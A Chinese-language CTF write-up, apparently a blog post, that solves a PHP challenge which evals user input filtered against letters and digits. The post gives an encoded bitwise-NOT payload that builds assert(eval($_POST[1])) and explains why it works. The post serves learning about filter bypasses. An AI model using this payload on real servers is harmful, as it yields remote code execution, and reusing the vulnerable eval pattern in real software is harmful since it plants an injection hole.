---
title: "无数字字母RCE"
pubDatetime: 2025-01-20T21:06:41.000+08:00
description: "无数字字母RCE"
tags: ["RCE"]
---
## 题目: [RCE ME](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]RCE%20ME)
```php
<?php
error_reporting(E_ALL);
if(isset($_GET['code'])){
    $code=$_GET['code'];
    if(strlen($code)>40){
        die("This is too Long.");
    }
    if(preg_match("/[A-Za-z0-9]+/",$code)){
        die("NO.");
    }
    echo $code;
    echo "</Br>".strlen($code)."</Br>";
    eval($code);
}
highlight_file(__FILE__);
```
## 方法
1. 字符串取反绕过
2. 字符串异或(同上)

## payload
```
?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6);
```

第一个字符括号内的结果是`assert`,
第二个括号内结果是`eval($_POST[1])`

执行顺序是
1. 解析变量 得到 `assert` 和 `eval($_POST[1])`
2. 调用eval,解析变量
3. 调用assert,执行代码

## Q
1. 为什么不能直接构造`$_POST[1]`,而要加上`assert(eval(..))`?

    **A:**
    直接构造`$_POST[1]`,执行的是
    ```php
    eval('$_POST[1]');
    ```
    作用仅限于解析了POST变量1
    而不是所期望执行的
    ```php
    eval($_POST[1])
    ```
    先取得变量,再执行代码.
2. 为什么不能直接构造`eval($_POST[1])`?
    **A:**
    如果可以使用字母,直接传递`?code=eval($_POST[1]);`,可以达到效果,第一层eval获取了变量,第二层eval执行代码
    但是不能使用字母时,由于**eval不是一个php函数,而是语言构造器,不能采用可变函数的方式调用**,同样的,echo、include...也不行。详情见[php可变函数](https://www.php.net/manual/zh/functions.variable-functions.php)


